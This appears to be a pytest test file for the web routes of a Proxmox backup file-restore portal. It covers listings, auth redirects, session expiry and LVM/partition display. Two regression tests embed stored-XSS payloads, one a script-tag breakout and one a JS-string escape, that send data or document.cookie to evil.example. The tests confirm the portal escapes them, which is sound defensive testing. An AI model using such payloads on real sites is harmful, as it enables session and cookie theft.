"""End-to-end-ish tests for the FastAPI routes.

The PVE client layer is stubbed out per-test (monkeypatched async fakes),
so nothing here touches the network. Auth is bypassed by overriding the
`get_session` dependency, except where the test is specifically about the
unauthenticated path.
"""

import asyncio
import dataclasses
import io
import json
import time
import zipfile

import httpx
import pytest

main = pytest.importorskip("backend.main", reason="backend.main needs FastAPI")
from fastapi.testclient import TestClient

from backend import auth, dir_cache, job_history, pve_client

ARCHIVES = [
    {"volid": "pbs:backup/vm/133/2026-08-30T02:03:57Z", "ctime": 200, "size": 10, "verification": {"state": "ok"}},
    {"volid": "pbs:backup/vm/133/2026-08-29T02:03:57Z", "ctime": 100, "size": 9, "verification": {"state": "failed"}},
    {"volid": "pbs:backup/ct/104/2026-08-30T05:00:00Z", "ctime": 150, "size": 5, "verification": {}},
]


@pytest.fixture
def client(session_data, monkeypatch):
    async def fake_archives(session):
        return pve_client.BackupListing(archives=list(ARCHIVES))

    async def fake_names(session):
        return {"133": "webserver"}

    monkeypatch.setattr(pve_client, "list_backup_archives", fake_archives)
    monkeypatch.setattr(pve_client, "list_guest_names", fake_names)

    main.app.dependency_overrides[auth.get_session] = lambda: session_data
    main.app.dependency_overrides[auth.get_session_keepalive] = lambda: session_data
    with TestClient(main.app) as c:
        yield c
    main.app.dependency_overrides.clear()


def test_index_lists_groups_and_defaults_to_first(client):
    resp = client.get("/")
    assert resp.status_code == 200
    body = resp.text
    # Groups sort by (type, vmid): ct:104 comes first and is selected by default.
    assert "2026-08-30T05:00:00Z" in body
    # The vm/133 group (and its resolved name) still ships in the task-picker JSON.
    assert "webserver" in body


def test_index_respects_task_query(client):
    resp = client.get("/", params={"task": "vm:133"})
    assert resp.status_code == 200
    body = resp.text
    # vm:133 has two snapshots; the newer one only, sorted first.
    assert "2026-08-30T02:03:57Z" in body
    assert "2026-08-29T02:03:57Z" in body


def test_index_renders_version_and_repo_link_in_about_box(client, project_root):
    from backend.version import REPO_URL

    resp = client.get("/")
    body = resp.text
    assert f"v{(project_root / 'VERSION').read_text().strip()}" in body
    assert REPO_URL in body


def test_index_escapes_guest_name_containing_script_close_tag(session_data, monkeypatch):
    """A PVE user needs only VM.Config.Options (far below file-restore/PBS
    access) to rename a guest. json.dumps() doesn't escape "<", so a name
    containing a literal "</script>" would close the `<script
    id="groups-data">` block early and let attacker-supplied markup run in
    every other portal user's session (stored XSS) unless "<" is escaped
    before the JSON is embedded with `|safe`."""
    payload = "</script><script>fetch('https://evil.example/steal')</script>"

    async def fake_archives(session):
        return pve_client.BackupListing(archives=list(ARCHIVES))

    async def fake_names(session):
        return {"133": payload}

    monkeypatch.setattr(pve_client, "list_backup_archives", fake_archives)
    monkeypatch.setattr(pve_client, "list_guest_names", fake_names)
    main.app.dependency_overrides[auth.get_session] = lambda: session_data
    try:
        with TestClient(main.app) as c:
            resp = c.get("/", params={"task": "vm:133"})
    finally:
        main.app.dependency_overrides.clear()
    assert resp.status_code == 200
    assert "</script><script>fetch" not in resp.text
    assert "\\u003c/script>\\u003cscript>fetch" in resp.text


def test_index_reads_task_and_identity_from_dataset_not_inline_js(client):
    """taskPicker(...) and userMenu(...) used to splice guest_type/guest_vmid
    and the current PVE username directly into a single-quoted JS string
    inside x-data (same escaping-context bug as tree_nodes.html's
    trackTreeToggle - Jinja's HTML-attribute escaping doesn't protect an
    attribute the browser HTML-decodes before Alpine evaluates it as JS).
    Both must now read the value back out of the element's own dataset."""
    resp = client.get("/")
    assert resp.status_code == 200
    body = resp.text
    assert "taskPicker(JSON.parse(document.getElementById('groups-data').textContent), $el.dataset.task)" in body
    assert "userMenu($el.dataset.identity)" in body
    assert "taskPicker(JSON.parse(document.getElementById('groups-data').textContent), 'ct:104')" not in body
    assert "userMenu('alice@pam')" not in body


def test_index_shows_a_banner_and_still_renders_when_a_storage_is_inaccessible(session_data, monkeypatch):
    async def fake_archives(session):
        return pve_client.BackupListing(
            archives=[], errors=[pve_client.StorageError("pbs-tier1-external", "permission denied — grant the role")]
        )

    async def fake_names(session):
        return {}

    monkeypatch.setattr(pve_client, "list_backup_archives", fake_archives)
    monkeypatch.setattr(pve_client, "list_guest_names", fake_names)
    main.app.dependency_overrides[auth.get_session] = lambda: session_data
    try:
        with TestClient(main.app) as c:
            resp = c.get("/")
    finally:
        main.app.dependency_overrides.clear()
    assert resp.status_code == 200
    assert "pbs-tier1-external" in resp.text
    assert "could not be read" in resp.text


def test_index_evicts_dir_cache_entries_for_volumes_no_longer_listed(client, session_data):
    """Issue #109 follow-up: a snapshot pruned by PBS retention, or a
    user's revoked access to one, must not leave its dir_cache rows
    behind forever - reconciled against this same request's own live
    archive list on every normal page load."""
    asyncio.run(dir_cache.set(session_data.username, "pbs:backup/vm/999/2020-01-01T00:00:00Z", "/", [{"text": "x"}]))
    asyncio.run(
        dir_cache.set(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/", [{"text": "kept"}])
    )
    resp = client.get("/")
    assert resp.status_code == 200
    assert asyncio.run(dir_cache.get(session_data.username, "pbs:backup/vm/999/2020-01-01T00:00:00Z", "/")) is None
    assert asyncio.run(
        dir_cache.get(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/")
    ) == [{"text": "kept"}]


def test_index_skips_dir_cache_eviction_when_a_storage_errored(session_data, monkeypatch):
    """A transient PVE hiccup on one storage must never look like
    "nothing exists anymore" and wipe good cache entries from the
    storages that did answer."""
    asyncio.run(dir_cache.set(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/", [{"text": "x"}]))

    async def fake_archives(session):
        return pve_client.BackupListing(
            archives=[], errors=[pve_client.StorageError("pbs-tier1-external", "permission denied")]
        )

    async def fake_names(session):
        return {}

    monkeypatch.setattr(pve_client, "list_backup_archives", fake_archives)
    monkeypatch.setattr(pve_client, "list_guest_names", fake_names)
    main.app.dependency_overrides[auth.get_session] = lambda: session_data
    try:
        with TestClient(main.app) as c:
            resp = c.get("/")
    finally:
        main.app.dependency_overrides.clear()
    assert resp.status_code == 200
    assert asyncio.run(
        dir_cache.get(session_data.username, "pbs:backup/vm/133/2026-08-30T02:03:57Z", "/")
    ) == [{"text": "x"}]


def test_index_requires_auth():
    main.app.dependency_overrides.clear()
    with TestClient(main.app) as c:
        resp = c.get("/", follow_redirects=False)
    assert resp.status_code == 302
    assert resp.headers["location"] == "/login"


def test_htmx_unauthorized_returns_hx_redirect():
    main.app.dependency_overrides.clear()
    with TestClient(main.app) as c:
        resp = c.get("/api/browse", params={"volume": "v"}, headers={"HX-Request": "true"})
    assert resp.status_code == 200
    assert resp.headers["HX-Redirect"] == "/login"


def test_api_unauthorized_returns_401_json_not_a_redirect():
    # fetch() follows a 302 transparently and reads the login HTML as a
    # success; the app.js widgets need a real 401 to act on (issue #27).
    main.app.dependency_overrides.clear()
    with TestClient(main.app) as c:
        resp = c.get("/api/browse", params={"volume": "v"}, follow_redirects=False)
    assert resp.status_code == 401
    assert resp.json()["detail"] == "Not logged in"


def test_expired_session_redirects_page_load_with_reason(session_data):
    main.app.dependency_overrides.clear()
    session_data.last_activity_at = time.time() - (31 * 60)
    auth._sessions["expired-sid"] = session_data
    with TestClient(main.app) as c:
        c.cookies.set("session_id", "expired-sid")
        resp = c.get("/", follow_redirects=False)
    assert resp.status_code == 302
    assert resp.headers["location"] == "/login?reason=expired"


def test_expired_session_on_api_returns_401_with_expiry_detail(session_data):
    main.app.dependency_overrides.clear()
    session_data.last_activity_at = time.time() - (31 * 60)
    auth._sessions["expired-sid"] = session_data
    with TestClient(main.app) as c:
        c.cookies.set("session_id", "expired-sid")
        resp = c.get("/api/browse", params={"volume": "v"}, headers={"HX-Request": "true"})
    assert resp.status_code == 200
    assert resp.headers["HX-Redirect"] == "/login?reason=expired"


def test_restore_jobs_poll_does_not_refresh_session_activity(session_data):
    # The 4s restore-jobs poll must not keep an idle session alive
    # (issue #27) - so an open-but-unused tab still times out.
    main.app.dependency_overrides.clear()
    before = time.time() - 600
    session_data.last_activity_at = before
    auth._sessions["poll-sid"] = session_data
    with TestClient(main.app) as c:
        c.cookies.set("session_id", "poll-sid")
        assert c.get("/api/restore-jobs").status_code == 200
    assert auth._sessions["poll-sid"].last_activity_at == before


def test_restore_jobs_poll_401s_once_the_session_has_idled_out(session_data):
    main.app.dependency_overrides.clear()
    session_data.last_activity_at = time.time() - (31 * 60)
    auth._sessions["poll-sid"] = session_data
    with TestClient(main.app) as c:
        c.cookies.set("session_id", "poll-sid")
        resp = c.get("/api/restore-jobs", follow_redirects=False)
    assert resp.status_code == 401
    assert "poll-sid" not in auth._sessions


def test_login_page_shows_expired_notice(monkeypatch):
    async def realms():
        return []

    monkeypatch.setattr(auth, "list_realms", realms)
    with TestClient(main.app) as c:
        resp = c.get("/login?reason=expired")
    assert resp.status_code == 200
    assert "session expired" in resp.text.lower()


def test_browse_renders_file_grid(client, monkeypatch):
    async def fake_list_path(session, volume, filepath="/"):
        return [
            {"text": "etc", "leaf": False, "filepath": "L2V0Yw=="},
            {"text": "hosts", "leaf": True, "filepath": "L2V0Yy9ob3N0cw==", "size": 12, "mtime": 0},
        ]

    monkeypatch.setattr(pve_client, "list_path", fake_list_path)
    resp = client.get("/api/browse", params={"volume": "vol", "filepath": "/"})
    assert resp.status_code == 200
    assert "etc" in resp.text and "hosts" in resp.text


def test_browse_renders_drive_icon_for_root_entries(client, monkeypatch):
    """Issue #64: a root-level, non-leaf entry (a virtual disk) gets the
    same drive SVG the tree pane already uses, not the plain folder
    emoji a subdirectory gets."""

    async def fake_list_path(session, volume, filepath="/"):
        if filepath == "/":
            return [{"text": "drive-scsi0.img.fidx", "leaf": False, "filepath": "L2RyaXZl"}]
        return [{"text": "etc", "leaf": False, "filepath": "L2V0Yw=="}]

    monkeypatch.setattr(pve_client, "list_path", fake_list_path)

    root_resp = client.get("/api/browse", params={"volume": "vol", "filepath": "/"})
    assert "tree-icon" in root_resp.text
    assert "drive-scsi0.img.fidx" in root_resp.text

    sub_resp = client.get("/api/browse", params={"volume": "vol", "filepath": "L2RyaXZl"})
    assert "tree-icon" not in sub_resp.text
    assert "&#128193;" in sub_resp.text  # plain folder emoji for a non-root directory


# Issue #66: a 3-disk VM whose LVM volume group ("myvg", to avoid any
# substring collision with the filepath tokens below) spans all three -
# every disk's own "lvm" folder shows the identical VG (different filepath
# tokens per disk, same content - confirmed live 2026-09-25), same shape
# the real screenshot behind #66 showed. "disk0" also has a "boot" entry
# alongside "part"/"lvm" (a stand-in for some as-yet-unobserved third
# category) so flattening only fires when "part" truly has zero siblings.
# "drive-efidisk0" has no LVM at all and only a single "part" child, to
# exercise the lone-part flatten.
_LVM_VOLUME = "pbs:backup/vm/205/2026-09-25T00:00:00Z"
_LVM_TREE = {
    "/": [
        {"text": "drive-scsi0.img.fidx", "leaf": False, "filepath": "tok-disk0"},
        {"text": "drive-scsi1.img.fidx", "leaf": False, "filepath": "tok-disk1"},
        {"text": "drive-scsi2.img.fidx", "leaf": False, "filepath": "tok-disk2"},
        {"text": "drive-efidisk0.img.fidx", "leaf": False, "filepath": "tok-efidisk0"},
    ],
    "tok-disk0": [
        {"text": "part", "leaf": False, "filepath": "tok-disk0-part"},
        {"text": "lvm", "leaf": False, "filepath": "tok-disk0-lvm"},
        {"text": "boot", "leaf": False, "filepath": "tok-disk0-boot"},
    ],
    "tok-disk1": [
        {"text": "part", "leaf": False, "filepath": "tok-disk1-part"},
        {"text": "lvm", "leaf": False, "filepath": "tok-disk1-lvm"},
    ],
    "tok-disk2": [
        {"text": "part", "leaf": False, "filepath": "tok-disk2-part"},
        {"text": "lvm", "leaf": False, "filepath": "tok-disk2-lvm"},
    ],
    "tok-disk0-lvm": [{"text": "myvg", "leaf": False, "filepath": "tok-disk0-vg"}],
    "tok-disk1-lvm": [{"text": "myvg", "leaf": False, "filepath": "tok-disk1-vg"}],
    "tok-disk2-lvm": [{"text": "myvg", "leaf": False, "filepath": "tok-disk2-vg"}],
    "tok-disk0-vg": [
        {"text": "home", "leaf": False, "filepath": "tok-vg-home"},
        {"text": "root", "leaf": False, "filepath": "tok-vg-root"},
        {"text": "swap", "leaf": False, "filepath": "tok-vg-swap"},
    ],
    "tok-vg-home": [],  # mountable but empty - issue #80's readability probe lands here
    "tok-vg-root": [],
    "tok-vg-swap": [],
    "tok-efidisk0": [{"text": "part", "leaf": False, "filepath": "tok-efidisk0-raw"}],
    "tok-efidisk0-raw": [{"text": "1", "leaf": False, "filepath": "tok-efidisk0-raw-1"}],
    "tok-efidisk0-raw-1": [],  # mountable but empty - issue #80's readability probe lands here
}


async def _fake_lvm_list_path(session, volume, filepath="/"):
    return _LVM_TREE[filepath]


def test_browse_root_elevates_lvm_volume_groups(client, monkeypatch):
    """Issue #66: a VG spanning multiple disks gets ONE root-level entry
    (deduped across the disks it spans) instead of forcing the user to
    pick an arbitrary disk to find it under."""
    monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "/", "crumbs": "[]"})
    assert resp.status_code == 200
    # Every disk still shows (the "part" side of each is still real content).
    for disk in ("drive-scsi0.img.fidx", "drive-scsi1.img.fidx", "drive-scsi2.img.fidx", "drive-efidisk0.img.fidx"):
        assert disk in resp.text
    assert "LVM myvg" in resp.text  # prefixed so it doesn't read as just another disk
    # Deduped to exactly one disk's copy - not the same VG showing up once
    # per disk it spans (which disk wins is non-deterministic - asyncio.
    # gather races the 3 probes - so check exactly one token, not a specific one).
    winners = [t for t in ("tok-disk0-vg", "tok-disk1-vg", "tok-disk2-vg") if t in resp.text]
    assert len(winners) == 1
    assert "LVM Volume" in resp.text
    assert "polygon points" in resp.text  # the LVM icon, distinct from the drive icon


def test_browse_disk_level_hides_lvm_and_keeps_part_with_a_real_sibling(client, monkeypatch):
    """Issue #66: a disk that still has other real, non-LVM content
    alongside "part" (here "boot") keeps "part" as its own folder when
    browsed directly - only the now-redundant "lvm" folder (elevated to
    root) is hidden, and "part" is left alone only when it's truly the
    sole remaining child (see the lone-part test below)."""
    monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)
    crumbs = json.dumps(
        [{"label": "Root", "filepath": "/"}, {"label": "drive-scsi0.img.fidx", "filepath": "tok-disk0"}]
    )
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "tok-disk0", "crumbs": crumbs})
    assert resp.status_code == 200
    assert "boot" in resp.text
    assert "part" in resp.text
    assert "lvm" not in resp.text


def test_browse_disk_level_flattens_lone_part(client, monkeypatch):
    """Issue #66: when "part" is a disk's only remaining child (no LVM or
    anything else alongside it), the indirection folder itself is skipped
    - partition numbers show directly under the disk."""
    monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)
    crumbs = json.dumps(
        [{"label": "Root", "filepath": "/"}, {"label": "drive-efidisk0.img.fidx", "filepath": "tok-efidisk0"}]
    )
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "tok-efidisk0", "crumbs": crumbs})
    assert resp.status_code == 200
    assert 'data-name="part"' not in resp.text
    assert "tok-efidisk0-raw-1" in resp.text  # the "part" folder's own child, shown directly instead


def test_browse_partition_folder_gets_the_partition_type_label(client, monkeypatch):
    """Issue #83: a numbered partition folder (this disk's flattened "1")
    gets a distinct "Partition" type_label/icon, not the generic
    "Folder" every other directory gets."""
    monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)
    crumbs = json.dumps(
        [{"label": "Root", "filepath": "/"}, {"label": "drive-efidisk0.img.fidx", "filepath": "tok-efidisk0"}]
    )
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "tok-efidisk0", "crumbs": crumbs})
    assert resp.status_code == 200
    assert "<td>Partition</td>" in resp.text


def test_browse_lvm_logical_volume_gets_the_partition_type_label(client, monkeypatch):
    """Issue #83: same distinct type_label/icon for a logical volume
    inside an elevated LVM volume group's own listing - also a
    filesystem root, not a plain directory."""
    monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)
    crumbs = json.dumps([{"label": "Root", "filepath": "/"}, {"label": "LVM myvg", "filepath": "tok-disk0-vg"}])
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "tok-disk0-vg", "crumbs": crumbs})
    assert resp.status_code == 200
    assert resp.text.count("<td>Partition</td>") == 3  # home, root, swap


def test_browse_annotates_windows_drive_letter_on_partition_folder(client, monkeypatch):
    """Issue #77: a flattened partition folder ("1" under drive-efidisk0,
    same fixture as the flatten test above) gets its resolved drive
    letter appended for display - but the raw data-label used to build
    the navigational crumb trail must stay untouched ("1", not
    "1 (C:)"), since resolve_original_directory later parses that label
    as a partition number."""
    from backend import guest_agent, guest_original_location

    monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True))

    async def fake_disk_number(session, vmid, node, volume, disk_label):
        assert disk_label == "drive-efidisk0.img.fidx"
        return 0

    async def fake_letters(session, vmid, node, disk_number):
        assert disk_number == 0
        return {"1": "C:"}

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(guest_original_location, "resolve_windows_disk_number", fake_disk_number)
    monkeypatch.setattr(guest_original_location, "list_windows_drive_letters", fake_letters)

    crumbs = json.dumps(
        [{"label": "Root", "filepath": "/"}, {"label": "drive-efidisk0.img.fidx", "filepath": "tok-efidisk0"}]
    )
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "tok-efidisk0", "crumbs": crumbs})
    assert resp.status_code == 200
    assert "1 (C:)" in resp.text
    assert 'data-label="1"' in resp.text
    # Carried separately for the breadcrumb bar to render "1 (C:)" once
    # this folder is entered - never folded into data-label itself.
    assert 'data-drive-letter="C:"' in resp.text


def test_tree_annotates_windows_drive_letter_on_partition_folder(client, monkeypatch):
    """Same annotation, /api/tree side - the displayed label gets the
    drive letter, but the embedded crumbs_json keeps the raw "1"."""
    from backend import guest_agent, guest_original_location

    monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)

    async def fake_caps(session, guest_type, vmid):
        return _available_caps(design_b=guest_agent.PathAvailability(True))

    async def fake_disk_number(session, vmid, node, volume, disk_label):
        return 0

    async def fake_letters(session, vmid, node, disk_number):
        return {"1": "C:"}

    monkeypatch.setattr(guest_agent, "get_restore_capabilities", fake_caps)
    monkeypatch.setattr(guest_original_location, "resolve_windows_disk_number", fake_disk_number)
    monkeypatch.setattr(guest_original_location, "list_windows_drive_letters", fake_letters)

    crumbs = json.dumps(
        [{"label": "Root", "filepath": "/"}, {"label": "drive-efidisk0.img.fidx", "filepath": "tok-efidisk0"}]
    )
    resp = client.get("/api/tree", params={"volume": _LVM_VOLUME, "filepath": "tok-efidisk0", "crumbs": crumbs})
    assert resp.status_code == 200
    assert "1 (C:)" in resp.text
    assert "&#34;label&#34;: &#34;1&#34;" in resp.text
    # Carried as a separate crumbs_json field for the breadcrumb bar -
    # never folded into "label" itself.
    assert "&#34;driveLetter&#34;: &#34;C:&#34;" in resp.text


def test_browse_skips_drive_letter_annotation_for_containers(client, monkeypatch):
    """Issue #77: containers have no guest agent/disk concept at all -
    must never even attempt the capability check."""
    from backend import guest_agent

    async def fake_ct_list_path(session, volume, filepath="/"):
        return [{"text": "1", "leaf": False, "filepath": "a"}]

    async def boom(session, guest_type, vmid):
        raise AssertionError("must not check restore capabilities for a container")

    monkeypatch.setattr(pve_client, "list_path", fake_ct_list_path)
    monkeypatch.setattr(guest_agent, "get_restore_capabilities", boom)
    resp = client.get(
        "/api/browse", params={"volume": "pbs:backup/ct/205/2026-09-25T00:00:00Z", "filepath": "/", "crumbs": "[]"}
    )
    assert resp.status_code == 200


_UNREADABLE_TREE = {
    "/": [{"text": "drive-scsi0.img.fidx", "leaf": False, "filepath": "d0"}],
    "d0": [{"text": "part", "leaf": False, "filepath": "d0-part"}],
    "d0-part": [
        {"text": "1", "leaf": False, "filepath": "d0-part-1"},
        {"text": "2", "leaf": False, "filepath": "d0-part-2"},
        {"text": "3", "leaf": False, "filepath": "d0-part-3"},
    ],
    "d0-part-1": [{"text": "Windows", "leaf": False, "filepath": "d0-part-1-w"}],
    "d0-part-3": [],  # empty but genuinely mountable - must not be hidden
}


async def _fake_unreadable_list_path(session, volume, filepath="/"):
    if filepath == "d0-part-2":
        raise httpx.HTTPStatusError(
            "mounting 'drive-scsi0.img.fidx/part/2' failed: all mounts failed or no supported file system",
            request=httpx.Request("GET", "http://pve.test/x"),
            response=httpx.Response(400),
        )
    return _UNREADABLE_TREE[filepath]


def test_browse_hides_partition_pve_cant_mount(client, monkeypatch):
    """Issue #80: confirmed live 2026-09-28 - a partition PVE's file-
    restore helper can't mount (e.g. a Windows Storage Spaces stripe
    member) errors on `file-restore/list`, it doesn't list empty. That's
    the signal to hide it - and a genuinely empty-but-mountable
    partition (partition 3 here) must still show up, since "empty" on
    its own is indistinguishable from a real empty filesystem."""
    monkeypatch.setattr(pve_client, "list_path", _fake_unreadable_list_path)
    crumbs = json.dumps([{"label": "Root", "filepath": "/"}, {"label": "drive-scsi0.img.fidx", "filepath": "d0"}])
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "d0", "crumbs": crumbs})
    assert resp.status_code == 200
    assert 'data-filepath="d0-part-1"' in resp.text
    assert 'data-filepath="d0-part-3"' in resp.text
    assert 'data-filepath="d0-part-2"' not in resp.text


def test_tree_hides_partition_pve_cant_mount(client, monkeypatch):
    monkeypatch.setattr(pve_client, "list_path", _fake_unreadable_list_path)
    crumbs = json.dumps([{"label": "Root", "filepath": "/"}, {"label": "drive-scsi0.img.fidx", "filepath": "d0"}])
    resp = client.get("/api/tree", params={"volume": _LVM_VOLUME, "filepath": "d0", "crumbs": crumbs})
    assert resp.status_code == 200
    assert 'data-filepath="d0-part-1"' in resp.text
    assert 'data-filepath="d0-part-3"' in resp.text
    assert 'data-filepath="d0-part-2"' not in resp.text


def test_browse_never_probes_partition_readability_for_containers(client, monkeypatch):
    """Issue #80: containers have no partition concept - must never even
    attempt the extra mount-probe call."""

    async def fake_ct_list_path(session, volume, filepath="/"):
        if filepath == "/":
            return [{"text": "1", "leaf": False, "filepath": "1"}]
        raise AssertionError("must not probe a container's own folders for mount readability")

    monkeypatch.setattr(pve_client, "list_path", fake_ct_list_path)
    resp = client.get(
        "/api/browse", params={"volume": "pbs:backup/ct/205/2026-09-25T00:00:00Z", "filepath": "/", "crumbs": "[]"}
    )
    assert resp.status_code == 200
    assert 'data-filepath="1"' in resp.text


_HIDDEN_TREE = {
    "/": [
        {"text": "drive-scsi0.img.fidx", "leaf": False, "filepath": "h-d0"},
        {"text": "drive-scsi1.img.fidx", "leaf": False, "filepath": "h-d1"},
    ],
    "h-d0": [{"text": "part", "leaf": False, "filepath": "h-d0-part"}],
    "h-d0-part": [{"text": "1", "leaf": False, "filepath": "h-d0-part-1"}],
    "h-d1": [
        {"text": "part", "leaf": False, "filepath": "h-d1-part"},
        {"text": "lvm", "leaf": False, "filepath": "h-d1-lvm"},
    ],
    "h-d1-part": [{"text": "1", "leaf": False, "filepath": "h-d1-part-1"}],
    "h-d1-lvm": [{"text": "datavg", "leaf": False, "filepath": "h-vg"}],
    "h-vg": [
        {"text": "data", "leaf": False, "filepath": "h-vg-data"},
        {"text": "swap", "leaf": False, "filepath": "h-vg-swap"},
    ],
    "h-vg-data": [{"text": "somefile.txt", "leaf": True, "filepath": "h-vg-data-f"}],
}


async def _fake_hidden_list_path(session, volume, filepath="/"):
    if filepath in ("h-d0-part-1", "h-d1-part-1", "h-vg-swap"):
        raise httpx.HTTPStatusError(
            "mounting failed: all mounts failed or no supported file system",
            request=httpx.Request("GET", "http://pve.test/x"),
            response=httpx.Response(400),
        )
    return _HIDDEN_TREE[filepath]


def test_browse_root_hides_a_disk_whose_partitions_are_all_unmountable(client, monkeypatch):
    """A disk with no LVM content of its own and every partition
    unmountable shows nothing if browsed into - hide it from root
    entirely rather than offering a dead end."""
    monkeypatch.setattr(pve_client, "list_path", _fake_hidden_list_path)
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "/", "crumbs": "[]"})
    assert resp.status_code == 200
    assert "drive-scsi0.img.fidx" not in resp.text


def test_browse_root_keeps_a_disk_with_elevated_lvm_despite_unmountable_partitions(client, monkeypatch):
    """A disk whose own partitions are all unmountable still stays
    visible at root if it contributed to an elevated LVM volume group -
    that real content lives at root regardless of the disk's own `part`
    side."""
    monkeypatch.setattr(pve_client, "list_path", _fake_hidden_list_path)
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "/", "crumbs": "[]"})
    assert resp.status_code == 200
    assert "drive-scsi1.img.fidx" in resp.text
    assert "LVM datavg" in resp.text


def test_browse_hides_swap_volume_inside_an_lvm_group(client, monkeypatch):
    """A logical volume PVE's file-restore helper can't mount - a swap
    LV, in this case - is hidden from an elevated LVM volume group's
    own listing the same way an unmountable partition is hidden from a
    disk's."""
    monkeypatch.setattr(pve_client, "list_path", _fake_hidden_list_path)
    crumbs = json.dumps([{"label": "Root", "filepath": "/"}, {"label": "LVM datavg", "filepath": "h-vg"}])
    resp = client.get("/api/browse", params={"volume": _LVM_VOLUME, "filepath": "h-vg", "crumbs": crumbs})
    assert resp.status_code == 200
    assert 'data-filepath="h-vg-data"' in resp.text
    assert 'data-filepath="h-vg-swap"' not in resp.text


def test_tree_hides_swap_volume_inside_an_lvm_group(client, monkeypatch):
    monkeypatch.setattr(pve_client, "list_path", _fake_hidden_list_path)
    crumbs = json.dumps([{"label": "Root", "filepath": "/"}, {"label": "LVM datavg", "filepath": "h-vg"}])
    resp = client.get("/api/tree", params={"volume": _LVM_VOLUME, "filepath": "h-vg", "crumbs": crumbs})
    assert resp.status_code == 200
    assert 'data-filepath="h-vg-data"' in resp.text
    assert 'data-filepath="h-vg-swap"' not in resp.text


def test_browse_never_applies_lvm_view_to_container_volumes(client, monkeypatch):
    """Issue #66: containers have no disk/partition concept - a CT backup
    could legitimately have real top-level folders literally named "part"
    or "lvm", which must never be touched by this logic."""

    async def fake_ct_list_path(session, volume, filepath="/"):
        return [
            {"text": "part", "leaf": False, "filepath": "a"},
            {"text": "lvm", "leaf": False, "filepath": "b"},
        ]

    monkeypatch.setattr(pve_client, "list_path", fake_ct_list_path)
    resp = client.get(
        "/api/browse", params={"volume": "pbs:backup/ct/205/2026-09-25T00:00:00Z", "filepath": "/", "crumbs": "[]"}
    )
    assert resp.status_code == 200
    assert "part" in resp.text
    assert "lvm" in resp.text
    assert "LVM Volume" not in resp.text


def test_tree_root_elevates_lvm_volume_groups(client, monkeypatch):
    monkeypatch.setattr(pve_client, "list_path", _fake_lvm_list_path)
    resp = client.get("/api/tree", params={"volume": _LVM_VOLUME, "filepath": "/", "crumbs": "[]"})
    assert resp.status_code == 200
    assert "LVM myvg" in resp.text
    winners = [t for t in ("tok-disk0-vg", "tok-disk1-vg", "tok-disk2-vg") if t in resp.text]
    assert len(winners) == 1


def test_browse_error_partial_on_pve_failure(client, monkeypatch):
    async def boom(session, volume, filepath="/"):
        raise httpx.HTTPStatusError(
            "x",
            request=httpx.Request("GET", "http://x"),
            response=httpx.Response(403, request=httpx.Request("GET", "http://x")),
        )

    monkeypatch.setattr(pve_client, "list_path", boom)
    resp = client.get("/api/browse", params={"volume": "vol"})
    assert resp.status_code == 200
    assert "can't be browsed" in resp.text


def test_tree_lists_only_directories(client, monkeypatch):
    async def fake_list_path(session, volume, filepath="/"):
        return [
            {"text": "etc", "leaf": False, "filepath": "a"},
            {"text": "file.txt", "leaf": True, "filepath": "b"},
        ]

    monkeypatch.setattr(pve_client, "list_path", fake_list_path)
    resp = client.get("/api/tree", params={"volume": "vol", "filepath": "/", "crumbs": "[]"})
    assert resp.status_code == 200
    assert "etc" in resp.text
    assert "file.txt" not in resp.text


def test_tree_sorts_subdirectories_alphabetically(client, monkeypatch):
    """Issue #63: PVE's file-restore/list response order isn't
    alphabetical - unlike /api/browse, /api/tree wasn't sorting its own
    entries before this fix."""

    async def fake_list_path(session, volume, filepath="/"):
        return [
            {"text": "var", "leaf": False, "filepath": "c"},
            {"text": "Etc", "leaf": False, "filepath": "a"},
            {"text": "bin", "leaf": False, "filepath": "b"},
        ]

    monkeypatch.setattr(pve_client, "list_path", fake_list_path)
    resp = client.get("/api/tree", params={"volume": "vol", "filepath": "/", "crumbs": "[]"})
    assert resp.status_code == 200
    assert [resp.text.index(name) for name in ("bin", "Etc", "var")] == sorted(
        resp.text.index(name) for name in ("bin", "Etc", "var")
    )


def test_tree_filepath_is_not_interpolated_into_inline_js(client, monkeypatch):
    """A guest filesystem entry's name/filepath is attacker-controlled by
    anyone with plain write access inside the guest - far below the
    portal/PBS privilege of whoever later browses the backup. Filepaths
    must never be spliced into an inline JS string literal (Jinja's
    HTML-attribute escaping doesn't protect that context: the browser
    HTML-decodes the attribute before the JS parser sees it), only into
    a `data-*` attribute that JS reads back via `.dataset`."""
    payload = "x'); fetch('https://evil.example/steal?c='+document.cookie); //"

    async def fake_list_path(session, volume, filepath="/"):
        return [{"text": "dir", "leaf": False, "filepath": payload}]

    monkeypatch.setattr(pve_client, "list_path", fake_list_path)
    resp = client.get("/api/tree", params={"volume": "vol", "filepath": "/", "crumbs": "[]"})
    assert resp.status_code == 200
    body = resp.text
    # The @click handler must read the filepath back out of the element's
    # dataset rather than have it spliced into the handler's JS source as a
    # string literal - Jinja's HTML-entity escaping (which still applies to
    # the data-filepath="..." attribute below) does not protect an inline
    # event-handler attribute, since the browser HTML-decodes it before the
    # JS parser ever sees it.
    assert "trackTreeToggle($el.dataset.filepath, open)" in body
    assert "trackTreeToggle('" not in body
